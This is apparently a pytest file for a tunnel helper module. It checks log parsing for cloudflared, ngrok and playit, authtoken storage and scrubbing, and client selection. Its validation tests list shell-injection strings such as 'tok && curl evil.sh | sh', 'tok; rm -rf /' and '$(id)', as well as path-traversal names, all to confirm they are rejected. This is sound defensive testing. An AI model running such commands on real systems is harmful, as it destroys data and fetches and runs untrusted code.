"""Reading a public address out of a tunnel client's logs.

Parsing logs is the only interface either client offers for "what did I just
get?", which makes it the part most likely to rot when one of them changes its
output. So the patterns are pinned against real banner lines, and the failure
path — a client that starts and never says anything useful — is pinned too: an
invite link that leads nowhere is worse than being told no.

Nothing here installs or runs cloudflared. `Tunnel` is handed a subprocess that
prints a canned banner, which exercises the same draining thread, the same
regex and the same `wait` as the real thing.
"""

from __future__ import annotations

import subprocess
import sys
import time

import pytest

import tunnel as TUN


def speaking(lines: str) -> subprocess.Popen:
    """A process that prints `lines` the way a tunnel client would, then waits."""
    return subprocess.Popen(
        [sys.executable, "-c",
         "import sys,time;sys.stdout.write(sys.argv[1]);sys.stdout.flush();"
         "time.sleep(30)", lines],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)


CLOUDFLARED = """\
2026-08-24T12:00:00Z INF Thank you for trying Cloudflare Tunnel.
2026-08-24T12:00:00Z INF +----------------------------------------------------+
2026-08-24T12:00:00Z INF |  Your quick Tunnel has been created! Visit it at:   |
2026-08-24T12:00:00Z INF |  https://brave-cookie-runs-fast.trycloudflare.com   |
2026-08-24T12:00:00Z INF +----------------------------------------------------+
"""

NGROK = """\
t=2026-08-24T12:00:00+0000 lvl=info msg="starting web service"
t=2026-08-24T12:00:00+0000 lvl=info msg="started tunnel" name=command_line \
addr=http://localhost:8080 url=https://a1b2c3d4.ngrok-free.app
"""


@pytest.mark.parametrize("name,logs,expected", [
    ("cloudflared", CLOUDFLARED, "https://brave-cookie-runs-fast.trycloudflare.com"),
    ("ngrok", NGROK, "https://a1b2c3d4.ngrok-free.app"),
])
def test_the_address_is_found_in_the_clients_own_banner(name, logs, expected):
    backend = next(b for b in TUN.BACKENDS if b.name == name)
    link = TUN.Tunnel(backend, speaking(logs))
    try:
        assert link.wait(timeout=10) == expected
        # The hostname is what the public listener will be asked by, and so what
        # its Host check has to be told to answer to.
        assert link.host == expected.split("//")[1]
    finally:
        link.close()


def test_a_client_that_says_nothing_useful_fails_loudly():
    backend = TUN.BACKENDS[0]
    link = TUN.Tunnel(backend, speaking("ERR failed to connect to the edge\n"))
    try:
        with pytest.raises(TUN.TunnelError) as raised:
            link.wait(timeout=1.0)
        # The client's own last words go in the message: "it didn't work" is not
        # something anyone can act on.
        assert "failed to connect to the edge" in str(raised.value)
    finally:
        link.close()


def test_a_client_that_exits_is_not_waited_out():
    """No point sitting out the full timeout for a process that is already gone."""
    link = TUN.Tunnel(TUN.BACKENDS[0],
                      subprocess.Popen([sys.executable, "-c", "pass"],
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, text=True))
    with pytest.raises(TUN.TunnelError, match="exited immediately"):
        link.wait(timeout=30.0)     # returns long before this


def test_close_is_safe_twice_and_after_the_client_has_gone():
    link = TUN.Tunnel(TUN.BACKENDS[0], speaking(CLOUDFLARED))
    link.wait(timeout=10)
    link.close()
    assert not link.alive
    link.close()


def test_a_lookalike_hostname_is_not_a_tunnel_address():
    """The pattern is the only thing standing between us and a log line's URL."""
    backend = TUN.BACKENDS[0]
    assert not backend.url_re.search("https://trycloudflare.com.evil.example")
    assert not backend.url_re.search("http://plain.trycloudflare.com")


def test_the_client_is_asked_to_log_where_we_can_read_it():
    """ngrok's default is a full-screen UI that logs nowhere we can see."""
    ngrok = next(b for b in TUN.BACKENDS if b.name == "ngrok")
    assert "--log" in ngrok.argv(8080)
    # And cloudflared must be pointed at loopback, never at every interface.
    cloudflared = next(b for b in TUN.BACKENDS if b.name == "cloudflared")
    assert "http://127.0.0.1:8080" in cloudflared.argv(8080)


# ---------------------------------------------------------------------------
# the ngrok authtoken
# ---------------------------------------------------------------------------
# cloudflared quick tunnels are anonymous; ngrok is not, and will not open a
# tunnel for an account it cannot identify. So a machine using ngrok needs a
# token, and a token is a credential — most of what follows is about it not
# ending up somewhere it can be read.
import os                                                    # noqa: E402
import stat                                                  # noqa: E402
from pathlib import Path                                     # noqa: E402


@pytest.fixture
def home(tmp_path, monkeypatch):
    """A throwaway home, so no test can read or write the real token."""
    monkeypatch.setattr(Path, "home", staticmethod(lambda: tmp_path))
    monkeypatch.delenv(TUN.AUTHTOKEN_ENV, raising=False)
    return tmp_path


NGROK_BACKEND = next(b for b in TUN.BACKENDS if b.name == "ngrok")
CF_BACKEND = next(b for b in TUN.BACKENDS if b.name == "cloudflared")


def fake_tunnel(backend, lines, secret: str = "") -> TUN.Tunnel:
    """A tunnel over a client that prints `lines` and then goes quiet."""
    return TUN.Tunnel(backend, speaking("\n".join(lines) + "\n"), secret=secret)


def test_the_token_never_reaches_the_command_line():
    """`ps` is readable by everyone on the machine, and history keeps forever.

    ngrok takes `--authtoken` as an argument and this deliberately does not use
    it. An environment variable is not secret either, but it is visible only to
    this user, which is the difference that matters.
    """
    assert "SECRET" not in " ".join(NGROK_BACKEND.argv(9000))
    assert NGROK_BACKEND.environ("SECRET")[TUN.AUTHTOKEN_ENV] == "SECRET"


def test_the_child_inherits_our_environment_rather_than_a_bare_one():
    """A replacement environment would lose PATH, HOME and ngrok's own config."""
    env = NGROK_BACKEND.environ("SECRET")
    assert set(os.environ) <= set(env)


def test_cloudflared_is_never_handed_a_token_it_has_no_use_for():
    assert CF_BACKEND.environ("SECRET") is None
    assert NGROK_BACKEND.environ("") is None        # nothing to pass, so nothing to change


def test_a_token_is_looked_for_in_the_documented_order(home, monkeypatch):
    assert TUN.resolve_token() == ""                       # nowhere at all
    TUN.save_token("from-the-file")
    assert TUN.resolve_token() == "from-the-file"
    monkeypatch.setenv(TUN.AUTHTOKEN_ENV, "from-the-env")
    assert TUN.resolve_token() == "from-the-env"           # env beats the file
    assert TUN.resolve_token("explicit") == "explicit"     # and an argument beats both


def test_a_saved_token_is_readable_only_by_its_owner(home):
    path = TUN.save_token("hunter2")
    assert path.read_text().strip() == "hunter2"
    mode = stat.S_IMODE(path.stat().st_mode)
    assert not mode & (stat.S_IRGRP | stat.S_IROTH), oct(mode)
    assert not mode & (stat.S_IWGRP | stat.S_IWOTH), oct(mode)


def test_the_token_is_kept_in_the_home_directory_not_beside_the_game(home):
    """A build gets zipped and handed to people; decklists travel with it."""
    assert TUN.save_token("hunter2").is_relative_to(home)
    assert "decks" not in str(TUN.token_path())


def test_a_blank_token_is_not_saved_over_a_real_one(home):
    TUN.save_token("real")
    for blank in ("", "   ", None):
        with pytest.raises(ValueError):
            TUN.save_token(blank)
    assert TUN.read_token() == "real"


def test_forgetting_says_whether_there_was_anything_to_forget(home):
    assert not TUN.forget_token()
    TUN.save_token("hunter2")
    assert TUN.forget_token()
    assert TUN.read_token() == ""


def test_a_missing_or_unreadable_token_file_is_not_an_error(home):
    assert TUN.read_token() == ""
    TUN.token_path().parent.mkdir(parents=True, exist_ok=True)
    TUN.token_path().mkdir()            # a directory where a file should be
    assert TUN.read_token() == ""


def test_a_token_is_scrubbed_from_anything_quoted_back_at_the_user():
    """A failing run quotes the client's last lines into the error message."""
    tunnel = fake_tunnel(NGROK_BACKEND, ["starting up", "using authtoken hunter2 now"],
                         secret="hunter2")
    with pytest.raises(TUN.TunnelError) as caught:
        tunnel.wait(timeout=0.2)
    assert "hunter2" not in str(caught.value)
    assert "<authtoken>" in str(caught.value)


@pytest.mark.parametrize("line", [
    "ERR_NGROK_4018: authentication failed",
    "ERR_NGROK_105",
    "authentication failed: Usage of ngrok requires a verified account",
    "The authtoken you specified is invalid",
])
def test_an_unauthenticated_ngrok_says_so_instead_of_timing_out(line):
    """The failure a first-time ngrok user hits, and it has its own fix."""
    tunnel = fake_tunnel(NGROK_BACKEND, ["starting up", line])
    with pytest.raises(TUN.TunnelError, match="authtoken"):
        tunnel.wait(timeout=0.2)
    assert "dashboard.ngrok.com" in TUN.AUTH_HINT


def test_an_ordinary_failure_is_still_reported_as_one():
    """Only an auth failure gets the auth advice."""
    tunnel = fake_tunnel(NGROK_BACKEND, ["starting up", "could not reach the server"])
    with pytest.raises(TUN.TunnelError) as caught:
        tunnel.wait(timeout=0.2)
    assert "authtoken" not in str(caught.value)
    assert "could not reach the server" in str(caught.value)


# ---------------------------------------------------------------------------
# doing the setup instead of describing it
# ---------------------------------------------------------------------------
# The settings screen can now install a client and hand ngrok its token. Both
# of those build a command line, and one of them builds it around a value typed
# into a browser — so most of what follows is about what cannot get into it.
@pytest.mark.parametrize("evil", [
    "tok; rm -rf /", "tok && curl evil.sh | sh", "tok`whoami`", "tok$(id)",
    "tok\nngrok config add-authtoken other", "--config=/etc/passwd",
    "tok with spaces", "", "   ", "short",
])
def test_a_token_that_is_not_a_token_never_reaches_a_command(evil, monkeypatch):
    """The field is a credential box on a web page; treat it like one."""
    ran = []
    monkeypatch.setattr(TUN.subprocess, "run",
                        lambda *a, **k: ran.append(a) or None)
    why = TUN.configure_token(evil)
    assert why and "does not look like" in why
    assert not ran, "a rejected token still reached subprocess"


def test_a_real_looking_token_is_handed_to_ngroks_own_store(monkeypatch):
    seen = {}

    class Done:
        returncode, stdout, stderr = 0, "Authtoken saved", ""

    monkeypatch.setattr(TUN.shutil, "which", lambda name: "/usr/bin/" + name)
    monkeypatch.setattr(TUN.subprocess, "run",
                        lambda argv, **kw: seen.update(argv=argv, kw=kw) or Done())
    assert TUN.configure_token("2abcDEF_ghi-jkl.mno") == ""
    assert seen["argv"] == ["ngrok", "config", "add-authtoken",
                            "2abcDEF_ghi-jkl.mno"]
    # A list, and never through a shell — the two together are what make the
    # value above impossible to read as anything but one argument.
    assert seen["kw"].get("shell") in (None, False)


def test_ngroks_own_complaint_is_passed_on_without_the_token_in_it(monkeypatch):
    class Done:
        returncode, stdout = 1, ""
        stderr = "ERROR: the authtoken 2abcDEF_ghi is not valid"

    monkeypatch.setattr(TUN.shutil, "which", lambda name: "/usr/bin/" + name)
    monkeypatch.setattr(TUN.subprocess, "run", lambda argv, **kw: Done())
    why = TUN.configure_token("2abcDEF_ghi")
    assert "not valid" in why and "2abcDEF_ghi" not in why


def test_configuring_without_ngrok_says_so_rather_than_failing_oddly(monkeypatch):
    monkeypatch.setattr(TUN.shutil, "which", lambda name: None)
    assert "not installed" in TUN.configure_token("2abcDEF_ghi-jkl")


@pytest.mark.parametrize("client", ["bogus", "ngrok; rm -rf /", "", "../ngrok"])
def test_only_a_client_we_know_can_be_installed(client):
    """The browser names one, so the name is checked against ours, not trusted."""
    assert TUN.installer(client) is None


def test_the_install_command_is_built_from_fixed_strings(monkeypatch):
    monkeypatch.setattr(TUN.sys, "platform", "darwin")
    monkeypatch.setattr(TUN.shutil, "which", lambda name: "/usr/bin/" + name)
    assert TUN.installer("ngrok") == ["brew", "install", "ngrok"]
    assert TUN.installer("cloudflared") == ["brew", "install", "cloudflared"]


def test_a_machine_with_no_package_manager_is_not_offered_an_install(monkeypatch):
    """Better a download page than fetching a binary from somewhere ourselves."""
    monkeypatch.setattr(TUN.shutil, "which", lambda name: None)
    assert TUN.installer("ngrok") is None
    assert TUN.DOWNLOAD_PAGES["ngrok"].startswith("https://ngrok.com/")


def test_a_job_reports_its_output_and_its_exit_code():
    job = TUN.Job([sys.executable, "-c",
                   "print('installing'); raise SystemExit(3)"]).start()
    for _ in range(200):
        if not job.running:
            break
        time.sleep(0.05)
    done = job.poll()
    assert done["running"] is False and done["ok"] is False and done["code"] == 3
    assert "installing" in done["output"]


def test_a_job_that_cannot_start_says_why_instead_of_hanging():
    job = TUN.Job(["definitely-not-a-real-command-xyz"]).start()
    for _ in range(200):
        if not job.running:
            break
        time.sleep(0.05)
    done = job.poll()
    assert done["running"] is False and not done["ok"] and done["error"]


# ---------------------------------------------------------------------------
# playit.gg
# ---------------------------------------------------------------------------
# The odd one out: its free tunnels are TCP with a `host:port` address and no
# TLS at all (HTTPS is a paid feature there), so it is the only backend whose
# address is not `https://`. Usable only because what crosses a signalling
# tunnel is sealed first — see `rendezvous.seal_signal`.
PLAYIT_BACKEND = next(b for b in TUN.BACKENDS if b.name == "playit")

PLAYIT_LOG = """\
playit (v0.15.0)
tunnel setup complete
your tunnel is live at foo-bar.gl.at.ply.gg:41337
"""


def test_a_playit_address_is_found_and_given_its_scheme():
    """The agent prints a bare `host:port`; the scheme comes from the backend."""
    link = TUN.Tunnel(PLAYIT_BACKEND, speaking(PLAYIT_LOG))
    try:
        assert link.wait(timeout=10) == "http://foo-bar.gl.at.ply.gg:41337"
        assert link.host == "foo-bar.gl.at.ply.gg"
        assert link.authority == "foo-bar.gl.at.ply.gg:41337"
    finally:
        link.close()


def test_playit_is_the_only_backend_without_tls():
    """If this ever changes silently, the sealing stops being optional."""
    plain = [b.name for b in TUN.BACKENDS if b.scheme != "https"]
    assert plain == ["playit"]


def test_the_playit_agent_is_asked_to_log_where_we_can_read_it():
    """Its default is a full-screen TUI that logs nowhere we can see."""
    assert "--stdout" in PLAYIT_BACKEND.argv(8080)


def test_playit_is_pointed_at_a_port_that_does_not_move():
    """Its tunnel is configured on the account against a fixed local port.

    The other two are *told* a port, so the OS can pick one; letting it pick
    for playit would leave the tunnel aimed at last night's number.
    """
    assert isinstance(TUN.PLAYIT_LOCAL_PORT, int)
    assert 1024 < TUN.PLAYIT_LOCAL_PORT < 65536
    assert str(TUN.PLAYIT_LOCAL_PORT) in TUN.PLAYIT_SETUP_HINT


def test_playit_is_not_offered_a_package_manager_install():
    """Its formula name is not something this could verify, and a wrong
    `brew install` fails in a way that looks like the app is broken."""
    assert "playit" not in TUN.INSTALLABLE
    assert TUN.installer("playit") is None
    assert TUN.DOWNLOAD_PAGES["playit"] == "https://playit.gg/download"


@pytest.mark.parametrize("platform", ["darwin", "win32"])
def test_the_two_platforms_asked_for_can_both_install_a_client(platform, monkeypatch):
    """Windows and macOS both have a package manager this can drive."""
    monkeypatch.setattr(TUN.sys, "platform", platform)
    monkeypatch.setattr(TUN.shutil, "which", lambda name: "/x/" + name)
    for client in TUN.INSTALLABLE:
        argv = TUN.installer(client)
        assert argv and all(isinstance(part, str) for part in argv)


def test_a_machine_running_playit_is_told_what_is_left_to_do(monkeypatch):
    monkeypatch.setattr(TUN, "find_backend", lambda: PLAYIT_BACKEND)
    state = TUN.status()
    assert state["client"] == "playit" and state["scheme"] == "http"
    assert "playit setup" in state["setup"]
    # Nothing to type here: both remaining steps are on their account.
    assert state["needsToken"] is False


# ---------------------------------------------------------------------------
# choosing which client to use
# ---------------------------------------------------------------------------
# Before this, whichever client came first in `BACKENDS` won and there was no
# way to say otherwise — which is wrong for the person who installed playit
# *because* cloudflared is what fails behind their CGNAT.
def installed(*names):
    return lambda name: ("/usr/bin/" + name) if name in names else None


def test_the_default_is_cloudflared_when_it_is_there(home, monkeypatch):
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared", "ngrok", "playit"))
    assert TUN.read_preference() == ""
    assert TUN.find_backend().name == "cloudflared"


def test_a_choice_is_honoured_over_the_default(home, monkeypatch):
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared", "playit"))
    TUN.save_preference("playit")
    assert TUN.find_backend().name == "playit"


def test_choosing_nothing_goes_back_to_automatic(home, monkeypatch):
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared", "playit"))
    TUN.save_preference("playit")
    assert TUN.save_preference("") == ""
    assert TUN.read_preference() == ""
    assert TUN.find_backend().name == "cloudflared"
    assert not TUN.preference_path().exists()


def test_a_choice_that_is_not_installed_falls_back_and_says_so(home, monkeypatch):
    """Rather than refusing to play with no explanation."""
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared"))
    TUN.save_preference("ngrok")
    assert TUN.find_backend().name == "cloudflared"
    state = TUN.status()
    assert state["prefer"] == "ngrok" and state["client"] == "cloudflared"
    assert state["preferMissing"] is True


def test_a_choice_that_is_installed_does_not_report_a_gap(home, monkeypatch):
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared", "ngrok"))
    TUN.save_preference("ngrok")
    assert TUN.status()["preferMissing"] is False


@pytest.mark.parametrize("junk", ["bogus", "../etc/passwd", "cloudflared; rm -rf /",
                                  "  ", "NGROK\n"])
def test_a_name_that_is_not_a_client_is_not_stored(home, junk):
    """It ends up in a filename and then in a `which` lookup."""
    saved = TUN.save_preference(junk)
    assert saved in ("", "ngrok")          # "NGROK\n" normalises; the rest do not
    if saved == "":
        assert TUN.read_preference() == ""


def test_a_hand_edited_preference_file_is_ignored_rather_than_trusted(home):
    TUN.preference_path().parent.mkdir(parents=True, exist_ok=True)
    TUN.preference_path().write_text("rm -rf /\n", encoding="utf-8")
    assert TUN.read_preference() == ""


def test_the_status_lists_what_can_be_chosen_and_what_is_here(home, monkeypatch):
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared"))
    state = TUN.status()
    assert state["choices"] == [b.name for b in TUN.BACKENDS]
    assert state["installed"] == ["cloudflared"]


def test_opening_a_tunnel_uses_the_client_it_was_asked_for(home, monkeypatch):
    seen = {}
    monkeypatch.setattr(TUN.shutil, "which", installed("cloudflared", "playit"))
    monkeypatch.setattr(TUN.subprocess, "Popen",
                        lambda argv, **kw: seen.update(argv=argv) or
                        (_ for _ in ()).throw(OSError("stop here")))
    with pytest.raises(TUN.TunnelError):
        TUN.open_tunnel(9000, prefer="playit")
    assert seen["argv"][0] == "playit"
